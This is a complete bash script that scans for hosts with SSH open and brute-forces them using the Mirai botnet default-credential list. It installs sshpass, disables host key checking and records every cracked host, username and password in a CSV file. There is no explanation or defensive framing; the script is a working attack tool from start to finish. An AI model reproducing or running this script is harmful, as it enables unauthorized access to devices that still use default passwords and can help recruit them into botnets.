#!/bin/bash

# Output CSV file
output_file="cracked_hosts.csv"
apt install sshpass -y &>/dev/null

echo "Host,Username,Password" > "$output_file"  

./get_net.sh

CREDENTIALS_FILE="mirai-botnet.txt"

while IFS=, read -r HOST PORT STATE; do

    if [[ "$PORT" == "22/tcp" && "$STATE" == "open" ]]; then
        echo "Trying SSH brute-force on $HOST"

        while IFS= read -r line; do
            
            USERNAME=$(echo "$line" | cut -d' ' -f1)
            PASSWORD=$(echo "$line" | cut -d' ' -f2)

            sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USERNAME@$HOST" "echo Success" &>/dev/null

            if [ $? -eq 0 ]; then
                echo "Success! Logged into $HOST with username '$USERNAME' and password '$PASSWORD'"
                echo "$HOST,$USERNAME,$PASSWORD" >> "$output_file"
                break
            fi

        done < "$CREDENTIALS_FILE"
    fi
done < open_ports.csv


